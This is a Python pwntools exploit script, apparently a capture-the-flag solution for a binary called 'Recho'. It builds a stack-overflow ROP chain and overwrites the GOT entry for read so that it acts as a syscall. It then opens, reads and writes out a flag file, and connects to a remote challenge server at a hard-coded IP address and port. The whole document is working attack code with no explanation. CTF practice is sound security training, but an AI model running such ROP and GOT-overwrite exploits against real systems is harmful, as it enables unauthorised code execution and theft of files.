from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./Recho")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./Recho")
else:
	p = remote("111.198.29.45","56691")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./Recho")

def sp(payload):
	p.send(str(len(payload)).ljust(0x10,"\x00"))
	p.send(payload)

def debugf():
	if debug:
		gdb.attach(p,"b *0x400834")

def rop(p1,p2,p3,syscall,table):
	payload = ""
	payload += p64(rdi) + p64(p1)
	payload += p64(rsi2) + p64(p2) + p64(0)
	payload += p64(rdx) + p64(p3)
	payload += p64(rax) + p64(table)
	payload += p64(syscall)
	return payload

def add(target,num):
	payload = ""
	payload += p64(rdi) + p64(target)
	payload += p64(rax) + p64(num)
	payload += p64(addrdi)
	return payload

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
p.recvuntil("Welcome to Recho server!\n")
#debugf()
rdi = 0x00000000004008a3
rsi2 = 0x00000000004008a1
rdx = 0x00000000004006fe
rsp3 = 0x000000000040089d
rax = 0x00000000004006fc
addrdi = 0x000000000040070d
bss_addr = 0x0000000000601500
leave = 0x0000000000400833
flag = 0x601058
"""
payload = ""
payload += "a" * 0x38
payload += rop(1,elf.got["write"],0x8,elf.plt["write"],0)
sp(payload)
p.shutdown("send")
p.interactive()"""
distance = 0x1de77
payload = "a" * (0x30)
payload += p64(0)
payload += add(elf.got["read"],0xe)
payload += rop(flag,0,0,elf.plt["read"],2)
payload += rop(3,bss_addr,0x100,elf.plt["read"],0)
payload += rop(1,bss_addr,0x100,elf.plt["read"],1)
"""
while distance > 0:
	if distance > 0xff:
		payload += add(elf.got["read"],0xff)
		distance -= 0xff
	else:
		payload += add(elf.got["read"],distance)
		distance -= distance
"""
sp(payload)
debugf()
p.shutdown("send")
p.interactive()
